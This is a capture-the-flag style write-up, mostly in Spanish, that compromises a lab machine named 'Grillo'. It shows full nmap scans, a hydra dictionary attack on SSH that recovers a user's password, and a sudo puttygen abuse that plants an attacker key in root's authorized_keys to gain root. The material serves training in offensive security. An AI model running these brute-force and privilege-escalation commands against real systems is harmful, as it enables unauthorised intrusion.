# Writeup: Operation Grillo 🦗

Análisis táctico y cadena de explotación de la máquina objetivo **Grillo** (IP: `192.168.0.111`). El vector de ataque comprende una intrusión por fuerza bruta táctica a nivel de SSH y una escalada de privilegios basada en una configuración indebida de SUID/Sudoers sobre el binario `puttygen` [GTFOBins alternative path].

---

## 🎯 Target Overview
* **Target IP:** `192.168.0.111`
* **OS:** Linux (Debian GNU/Linux 12 - Bookworm)
* **Architecture:** x86_64
* **Infrastructure:** Oracle VirtualBox hypervisor (`08:00:27:CE:AF:D8`)

---

## ⚡ Phase 01: Reconnaissance & Port Scanning

Ejecución de un escaneo SYN Stealth exhaustivo sobre los 65,535 puertos TCP para determinar la superficie de ataque expuesta.

```bash
# TCP Stealth Scan over all ports
sudo nmap -Pn -sS -p- --min-rate 5000 192.168.0.111
```

### Open Ports Output
* **22/tcp** - `SSH` - OpenSSH 9.2p1 Debian 2+deb12u2
* **80/tcp** - `HTTP` - Apache httpd 2.4.57 (Debian Default Page)

### Deep Service Enumeration
```bash
nmap -sCV -p 22,80 192.168.0.111
```
El banner de Apache confirma un despliegue estándar sin aplicaciones web secundarias visibles en la raíz. El servicio SSH expone la versión de OpenSSH vulnerable a ataques convencionales de autenticación si las credenciales son débiles.

---

## 🔑 Phase 02: Initial Access (Weaponization & Exploitation)

A través de inteligencia previa o enumeración local se identificó el nombre de usuario potencial `melanie`. Se procedió a ejecutar un ataque de diccionario dirigido contra el servicio SSH utilizando la wordlist `rockyou.txt`.

```bash
hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.111 -t 64
```

### Compromise Success
```log
[22][ssh] host: 192.168.0.111   login: melanie   password: trustno1
```
* **Identity:** `melanie`
* **Secret:** `trustno1`

Estableciendo sesión SSH interactiva y verificando vector de persistencia/privilegios iniciales:
```bash
ssh melanie@192.168.0.111
```

---

## 🚀 Phase 03: Privilege Escalation (From User to Root)

### Local Enumeration
Auditoría de los privilegios asignados en el archivo `/etc/sudoers` para el contexto de la sesión actual:

```bash
melanie@grillo:~\$ sudo -l
```
```log
Matching Defaults entries for melanie on grillo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User melanie may run the following commands on grillo:
    (root) NOPASSWD: /usr/bin/puttygen
```

### Exploitation Weapon: puttygen Abuse
El binario `/usr/bin/puttygen` permite manipular y exportar llaves criptográficas. Dado que corre con privilegios de `root` sin requerir credenciales (`NOPASSWD`), puede ser abusado para escribir archivos arbitrarios en el sistema de archivos, aprovechando la bandera `-o` (output file).

#### Execution Steps:
1. **Generación de un par de llaves SSH locales** en el home del usuario atacante:
   ```bash
   ssh-keygen -t rsa -b 3072 -f ~/.ssh/id_rsa -N ""
   ```

2. **Inyección de persistencia arbitraria:** Se utilizó `puttygen` con privilegios elevados para transformar la llave pública generada y escribirla directamente dentro de la estructura de llaves autorizadas de Root (`/root/.ssh/authorized_keys`). Esto sobrescribe/crea el vector de confianza SSH directo.
   ```bash
   sudo /usr/bin/puttygen ~/.ssh/id_rsa.pub -O public-openssh -o /root/.ssh/authorized_keys
   ```

---

## 🏴 Phase 04: Post-Exploitation & Loot

Una vez inyectada la llave pública en el entorno de `root`, se realiza un pivote local vía SSH apuntando al `localhost` como el usuario administrador supremo:

```bash
ssh root@localhost
```

### System Takeover Proof
```bash
root@grillo:~# whoami
root

root@grillo:~# id
uid=0(root) gid=0(root) grupos=0(root)

root@grillo:~# cat /root/root.txt
[REDACTED_ROOT_FLAG]
```

**System Compromised Successfully.** 💀
